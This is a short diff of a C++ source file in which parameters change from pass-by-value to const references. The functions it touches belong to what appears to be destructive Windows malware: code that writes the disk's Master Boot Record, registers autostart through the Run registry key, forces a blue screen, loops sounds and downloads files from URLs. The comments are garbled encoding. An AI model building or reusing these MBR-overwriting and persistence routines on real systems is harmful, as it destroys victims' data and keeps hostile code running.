@@ -15,7 +15,7 @@ bool GetPrivileges()
 }
 
 //Ð´MBR
-bool WritePhydriveMBR(unsigned int id,string msgstr)
+bool WritePhydriveMBR(unsigned int id,const string& msgstr)
 {
 	#pragma warning(push)
 	#pragma warning(disable:4309 4838)
@@ -73,7 +73,7 @@ string ReadPhydriveMBR(unsigned int id)
 
 
 //×¢²á×ÔÆô¶¯
-bool RegAutoStart(wstring name)
+bool RegAutoStart(const wstring& name)
 {
 	HKEY hKey;
 	const TCHAR *strRegPath = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
@@ -121,19 +121,19 @@ bool MakeBlueScreen(unsigned int errid)
 }
 
 //²¥·ÅÉùÒô
-bool PlaySoundFile(wstring soundname,bool sync)
+bool PlaySoundFile(const wstring& soundname,bool sync)
 {
 	return PlaySound(soundname.c_str(), NULL, SND_FILENAME | SND_NODEFAULT | (sync ? SND_SYNC : SND_ASYNC) | SND_LOOP) == TRUE;
 }
 
-bool DownloadFileFromURL(std::wstring url, std::wstring filepath)
+bool DownloadFileFromURL(const std::wstring& url, const std::wstring& filepath)
 {
 	return ((URLDownloadToFile(NULL, url.c_str(), filepath.c_str(), 0, NULL)) == S_OK);
 }
 
 
 //´ÓURL»ñÈ¡×Ö·û´®
-std::wstring GetDataFromURL(std::wstring url, bool& isok)
+std::wstring GetDataFromURL(const std::wstring& url, bool& isok)
 {
 	CInternetSession session;
 	CHttpFile* file = NULL;
